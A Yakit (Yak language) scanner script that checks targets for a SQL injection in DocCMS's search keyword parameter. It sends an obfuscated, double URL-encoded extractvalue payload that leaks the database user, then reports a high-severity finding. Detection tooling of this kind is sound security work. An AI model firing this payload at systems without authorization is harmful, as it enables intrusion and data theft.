yakit.AutoInitYakit()

# Input your code!
target = cli.String("root_url")
if target == ""{
    os.Exit(0)
}


logLevel_ = "info"
log.setLevel(logLevel_)

handleCheck = func(target){
    isTls = str.IsTLSServer(target)
    sendpacket = `GET /search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33 HTTP/1.1
Host: {{params(target)}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36`
    res, req, _ = poc.HTTP(sendpacket,
        poc.params({"target":target}),
        poc.https(isTls),
        poc.redirectTimes(0)    
    )

    //dump(res)
    drsp, derr = str.ParseBytesToHTTPResponse(res)
    header, body = str.SplitHTTPHeadersAndBodyFromPacket(res)

    if drsp.StatusCode == 200 && str.Contains(body, "ORDER BY id DESC"){
        yakit.Info("%v 存在DocCMS keyword SQL注入漏洞", target)
            risk.NewRisk(target,
                risk.title("DocCMS keyword SQL注入漏洞检测"),
                risk.severity("high"),
                risk.titleVerbose("DocCMS keyword SQL注入漏洞存在"),
                risk.type("sqli[DocCMS]"),
                risk.details({
                "request": req,
                "response": res,
                })
        )
    }else{
        yakitInfo = "不存在DocCMS keyword SQL注入漏洞"
    }
    return
}

ip, port, _ = str.ParseStringToHostPort(target)
addr = str.HostPort(ip,port)
handleCheck(addr)
